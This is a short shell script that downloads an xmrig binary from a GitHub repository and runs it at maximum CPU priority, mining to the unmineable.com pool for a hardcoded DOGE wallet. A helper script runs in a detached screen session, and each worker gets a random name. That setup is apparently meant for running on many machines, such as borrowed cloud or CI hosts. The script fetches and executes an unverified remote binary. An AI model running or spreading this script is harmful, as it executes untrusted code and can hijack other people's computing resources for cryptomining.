#!/bin/sh
sudo apt update
sudo apt install screen -y 
screen -dmS cpu.sh ./cpu.sh 65 75 
wget https://github.com/pogchampv10/CPU/raw/main/xmrig
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-CPU)
chmod +x xmrig
./xmrig --randomx-mode=fast --cpu-no-yield --threads=8 --cpu-max-threads-hint=100 --cpu-priority=5 --randomx-1gb-pages -o rx.unmineable.com:3333 -a rx -k -u DOGE:D5o7ggptjmEoKME4rdCBWdaVkZagiZBzvB.$WORKER -p x
